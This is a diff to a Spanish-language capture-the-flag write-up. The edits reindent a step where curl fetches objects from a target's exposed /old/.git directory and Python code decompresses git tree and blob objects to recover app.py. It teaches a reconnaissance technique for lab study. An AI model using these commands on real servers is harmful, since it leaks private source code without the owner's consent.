@@ -104,23 +104,24 @@ Lo primero que se me ocurre es mirar los distintos ***commits*** para ver si pue
    - Los otros 38 son el archivo (`607d941b9a009995ebecb3db5dbf54f40d28de`).
    
    Como los objetos ***tree*** almacenan los hashes de los archivos en formato binario puro, si usamos el comando de Python anterior no podríamos leer el contenido. Para limpiarlo:
+   
    ```bash
    curl -s "http://$IP/old/.git/objects/b1/607d941b9a009995ebecb3db5dbf54f40d28de" | python3 -c "
-import zlib, sys
-data = zlib.decompress(sys.stdin.buffer.read())
-header, body = data.split(b'\x00', 1)
-while body:
-	mode_name, rest = body.split(b'\x00', 1)
-	sha1 = rest[:20].hex()
-	body = rest[20:]
-	print(f'{mode_name.decode()} -> Hash: {sha1}')
-"
+	import zlib, sys
+	data = zlib.decompress(sys.stdin.buffer.read())
+	header, body = data.split(b'\x00', 1)
+	while body:
+		mode_name, rest = body.split(b'\x00', 1)
+		sha1 = rest[:20].hex()
+		body = rest[20:]
+		print(f'{mode_name.decode()} -> Hash: {sha1}')
+	"
    
-   # Respuesta
-   100644 app.py -> Hash: cbf47f50aca7f37aa7f98006174bfcf724be9b5e
-   40000 static -> Hash: 82ad181baa1afba57212664f86cb0c25cf042973
-   40000 templates -> Hash: abd654d2f11fae3471026e4891c805dc485eeaaf
-   ```
+	# Respuesta
+	100644 app.py -> Hash: cbf47f50aca7f37aa7f98006174bfcf724be9b5e
+	40000 static -> Hash: 82ad181baa1afba57212664f86cb0c25cf042973
+	40000 templates -> Hash: abd654d2f11fae3471026e4891c805dc485eeaaf
+	```
 
 1. El paso final es leer el contenido del archivo `app.py`. Los archivos en Git se guardan como objetos de tipo ***blob***. Al igual que antes, tenemos que construir la URL usando el hash de `app.py`.
    
@@ -133,8 +134,7 @@ data = zlib.decompress(sys.stdin.buffer.read())
 header, contenido_codigo = data.split(b'\x00', 1)
 print(contenido_codigo.decode('utf-8', errors='ignore'))
 "
-p
-   ```
+```
    
    ***Respuesta***
    
